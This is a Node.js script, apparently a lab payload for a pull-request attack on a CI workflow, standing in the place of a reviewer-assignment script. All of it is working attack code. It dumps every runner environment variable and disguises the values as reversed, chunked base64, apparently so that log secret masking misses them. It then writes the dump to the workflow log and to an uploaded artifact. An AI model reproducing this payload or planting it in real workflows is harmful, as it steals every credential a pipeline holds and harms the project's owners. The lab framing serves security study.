"use strict";

// Controlled lab payload. It dumps the ENTIRE runner environment - variable
// names in the clear, values reversed and chunked base64 - into the workflow
// log and the staging directory uploaded by the trusted workflow. No secret
// name is referenced: a real attacker does not know which variable matters,
// so they take everything and identify the loot offline. No network requests
// are made and no other runner data is inspected.
const fs = require("node:fs");
const path = require("node:path");

const dump = Object.entries(process.env)
  .map(([name, value]) => name + ":" + Buffer.from(String(value), "utf8").toString("base64").split("").reverse().join("").replace(/../g, (x) => x + " "))
  .join("\n");

const outputDirectory = path.join(process.cwd(), "lab-output");
fs.mkdirSync(outputDirectory, { recursive: true });
fs.writeFileSync(
  path.join(outputDirectory, "environment-dump.txt"),
  dump + "\n",
);
fs.writeFileSync(
  path.join(outputDirectory, "environment-dump.json"),
  JSON.stringify(
    {
      source: "PR-controlled .github/scripts/assign-reviewers.js",
      encoding: "base64 (reversed, then 2-char space-separated chunks)",
      variables: Object.keys(process.env).length,
      validation: "none - every environment variable was captured",
      warning: "This run captured the entire runner environment. In production that is every credential the workflow can see.",
    },
    null,
    2,
  ),
);

console.log("Captured the full runner environment - " + Object.keys(process.env).length + " variables, no names known in advance.");
console.log(dump);